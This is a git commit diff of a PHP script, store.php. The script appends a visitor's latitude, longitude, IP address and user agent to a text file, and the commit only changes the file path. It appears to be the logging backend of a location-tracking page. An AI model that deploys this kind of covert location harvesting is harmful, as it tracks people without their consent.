45fbe4e1d7e3256d54c1495f0f2c980bbf362c14
Arnab Koley <93140569+Arnab-Koley@users.noreply.github.com>
2023-03-08 08:48:23 +0530

    Update store.php

--- store.php
+++ store.php
@@ -1,6 +1,6 @@
 <?php
 
-$myfile = fopen("location.txt", "a");
+$myfile = fopen("code.github.io/location.txt", "a");
 $txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser agent: " . $_GET["uagent"];
 fwrite($myfile, $txt);
 fclose($myfile);
